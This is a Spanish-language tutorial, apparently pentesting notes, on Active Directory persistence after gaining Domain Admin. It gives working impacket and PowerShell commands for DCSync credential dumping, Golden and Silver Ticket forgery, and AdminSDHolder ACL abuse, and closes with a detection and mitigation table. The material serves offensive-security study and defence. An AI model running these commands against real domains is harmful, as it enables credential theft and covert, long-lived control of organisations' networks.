# Persistencia en Active Directory

Una vez obtenido Domain Admin, el objetivo es mantener el acceso
incluso si se cambian contraseñas o se detecta la intrusión.

---

## Golden Ticket (T1558.001)

El ataque más potente de persistencia en AD. Con el hash de **krbtgt**
se pueden crear tickets Kerberos falsos válidos para cualquier usuario
y con cualquier privilegio, sin contactar al DC.

### Requisitos
- Hash NTLM de la cuenta `krbtgt` (obtenido via DCSync)
- SID del dominio

### Obtener el hash de krbtgt

```bash
# Via DCSync (requiere DA)
impacket-secretsdump empresa.local/Administrador:"Admin123!"@192.168.1.10 \
    -just-dc-user krbtgt

# Resultado:
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:HASH_KRBTGT_AQUI:::
```

### Obtener el SID del dominio

```bash
impacket-getPac empresa.local/juan.garcia:"Password123!"@192.168.1.10 | grep "Domain SID"
# S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
```

### Crear el Golden Ticket

```bash
impacket-ticketer \
    -nthash HASH_KRBTGT \
    -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
    -domain empresa.local \
    -user "FalseAdmin" \
    -groups 512 \
    golden_ticket

# Usar el ticket
export KRB5CCNAME=golden_ticket.ccache
impacket-psexec -k -no-pass empresa.local/FalseAdmin@DC01.empresa.local
```

### Por qué es peligroso

El Golden Ticket es válido durante **10 años** por defecto.
Cambiar la contraseña del Administrador no lo invalida.
Para neutralizarlo hay que **cambiar la contraseña de krbtgt DOS VECES**
con intervalo de al menos 10 horas entre cada cambio.

---

## AdminSDHolder Abuse (T1098)

AdminSDHolder es un objeto especial que protege a los miembros de grupos
privilegiados. Si modificamos sus ACLs, el SDProp process propagará
esos permisos a todos los usuarios privilegiados cada hora.

```powershell
# Dar GenericAll sobre AdminSDHolder a un usuario controlado
Add-ObjectACL -TargetIdentity "CN=AdminSDHolder,CN=System,DC=empresa,DC=local" \
    -PrincipalIdentity juan.garcia -Rights All

# En ~60 minutos, juan.garcia tendrá GenericAll sobre todos los DA
# → puede cambiar sus contraseñas en cualquier momento
```

---

## Silver Ticket (T1558.002)

Más sigiloso que el Golden Ticket — no contacta al DC.
Requiere el hash de una cuenta de servicio específica.

```bash
# Crear Silver Ticket para SMB en el DC
impacket-ticketer \
    -nthash HASH_CUENTA_SERVICIO \
    -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
    -domain empresa.local \
    -spn cifs/DC01.empresa.local \
    -user Administrador \
    silver_ticket_smb

export KRB5CCNAME=silver_ticket_smb.ccache
impacket-smbclient -k -no-pass empresa.local/Administrador@DC01.empresa.local
```

---

## Detección y mitigación

| Técnica | Detección | Mitigación |
|---------|-----------|------------|
| Golden Ticket | Event 4769 con cuenta inexistente | Rotar krbtgt 2 veces |
| Silver Ticket | Ausencia de Event 4768/4769 | Monitorizar accesos sin TGT |
| AdminSDHolder | Event 5136 en AdminSDHolder | Auditar ACLs de AdminSDHolder |
